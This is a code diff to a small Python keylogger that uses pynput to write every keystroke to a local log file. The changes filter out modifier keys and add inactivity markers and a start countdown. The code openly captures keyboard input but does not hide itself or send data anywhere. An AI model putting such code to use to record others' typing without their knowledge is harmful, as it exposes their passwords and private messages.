@@ -1,5 +1,6 @@
 from pynput.keyboard import Key, Listener
 from threading import Timer
+import time
 # file_thread = threading.Thread(target=write_to_file, args=None)
 # file_thread.start()
 
@@ -13,9 +14,10 @@ def write_to_file(key):
         print("key is none")
 
 
-def write_newline():
+def write_inactivity():
     print("Jumping a new line")
     with open("keystrokes.log", "a") as file:
+        file.write("10 sec inactivity...")
         file.write("\n")  
 
 
@@ -26,11 +28,17 @@ def on_press(key):
     try:
         key_str = key.char
     except AttributeError:
-        print(f"Special key {key} pressed")
+        # print(f"Spec²ial key {key} pressed")
         key_str = str(key).replace("Key.", "")
-
-    write_to_file(key_str)
-    no_keystrokes = Timer(10, write_newline)
+    
+    if key_str == "alt" or key_str == "shift" or key_str == "ctrl":
+        pass
+    elif key_str == "enter":
+        write_to_file("\n")
+    else:
+        write_to_file(key_str)
+    
+    no_keystrokes = Timer(10, write_inactivity)
     no_keystrokes.start()
 
 
@@ -38,5 +46,8 @@ def on_press(key):
 listener = Listener(on_press=on_press)
 listener.start()  # Starts listening in the background
 
+print("3 seconds to go..")
+time.sleep(3)
+print("Go!")
 while True:
     pass
